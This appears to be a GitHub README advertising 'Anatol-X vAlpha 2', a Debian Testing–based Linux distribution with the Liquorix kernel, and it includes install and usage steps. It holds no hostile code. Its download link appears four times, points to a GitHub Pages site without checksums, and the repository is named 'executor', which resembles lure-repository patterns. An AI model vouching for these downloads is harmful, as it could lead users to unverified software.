# Anatol-X vAlpha 2 - Linux Distribution 2026

> **A streamlined, performance-oriented Linux distribution built on Debian Testing with the Liquorix kernel and a stripped-down KDE Plasma desktop for low-latency, responsive computing.**

[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vAlpha%202-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/logantaylor82/anatol-x-linux-executor?style=flat-square)](https://github.com/logantaylor82/anatol-x-linux-executor)

---

<p align="center">
  <a href="https://logantaylor82.github.io/anatol-x-linux-executor/">
    <img src="https://img.shields.io/badge/Download-Anatol-X%20Latest-brightgreen?style=for-the-badge" alt="Download Anatol-X">
  </a>
</p>

> **[Direct Download - Anatol-X vAlpha 2](https://logantaylor82.github.io/anatol-x-linux-executor/)**

---

[Download Latest Build](https://logantaylor82.github.io/anatol-x-linux-executor/)

---

## Overview

Anatol-X is a purpose-crafted Linux distribution that eliminates the excess found in many mainstream operating systems. It pairs a Debian Testing base with the Liquorix kernel to deliver outstanding responsiveness for routine desktop activities and resource-heavy tasks such as gaming. This distribution caters to users seeking speed, reliability, and a tidy environment while retaining modern capabilities.

The project targets power users, developers, and enthusiasts who want a system that boots rapidly, runs efficiently, and remains unobtrusive. The KDE Plasma desktop is configured to be minimal and tidy, offering a recognizable but streamlined interface. Every component is selected to minimize overhead while ensuring full compatibility with the extensive Debian software library.

---

## Key Features

- **Liquorix Kernel** – Preconfigured for enhanced desktop responsiveness and reduced latency
- **Debian Testing Foundation** – Rolling updates with access to the newest software packages
- **Minimal and Debloated** – Only core applications included, no extraneous software
- **Pure systemd** – Straightforward system management without alternative init frameworks
- **Calamares Installer** – User-friendly graphical installation suitable for all experience levels
- **KDE Plasma Desktop** – Adaptable, customizable, and lightweight desktop environment
- **Gaming Optimizations** – Kernel-level and system tweaks to minimize input delay and improve frame pacing

---

## Installation

Clone this repository or fetch the ISO from the link above. Write the image to a USB drive using your preferred method:

```bash
# Using dd (replace /dev/sdX with your USB device)
sudo dd if=anatol-x-alpha-2.iso of=/dev/sdX bs=4M status=progress && sync
```

Boot from the USB drive and launch the Calamares installer. Follow the on-screen instructions to partition your disk and finish the setup.

---

## Getting Started

After installation, the system boots directly into the KDE Plasma desktop. Common operations include:

- **Package Management** – Use APT with `sudo apt update && sudo apt install <package>`
- **System Updates** – Execute `sudo apt full-upgrade` to keep the system current
- **Kernel Maintenance** – The Liquorix kernel receives updates through standard apt repositories
- **Desktop Customization** – Open System Settings to modify appearance, widgets, and keyboard shortcuts

---

## Configuration

System settings reside in standard Linux directories:

- **Desktop Configuration** – `~/.config/` for Plasma and application preferences
- **System Configuration** – `/etc/` for global system files
- **Kernel Parameters** – Edit `/etc/sysctl.d/` for performance tuning

For advanced adjustments, the Liquorix kernel exposes additional parameters under `/sys/kernel/debug/sched/`.

---

## System Requirements

- **Processor** – x86-64 compatible, dual-core or better recommended
- **Memory** – 2 GB RAM minimum, 4 GB+ recommended for smooth desktop use
- **Storage** – 20 GB free disk space for base installation
- **Graphics** – Any GPU supported by the Linux kernel (NVIDIA/AMD/Intel)
- **USB Port** – For installation media (2 GB+ USB drive)

---

## Frequently Asked Questions

**How can I get support?**  
File an issue in the repository or visit the community forums for assistance with installation and configuration.

**Does this distribution receive regular updates?**  
Yes, since it is based on Debian Testing, updates flow continuously. Kernel updates are delivered through the Liquorix repositories.

**Can I install other desktop environments?**  
Certainly. Use `sudo apt install <desktop-package>` to add environments like GNOME or Xfce.

**The installer doesn't detect my hardware. What should I do?**  
Confirm that your system meets the minimum requirements. If graphics issues arise, try booting with the `nomodeset` kernel parameter.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
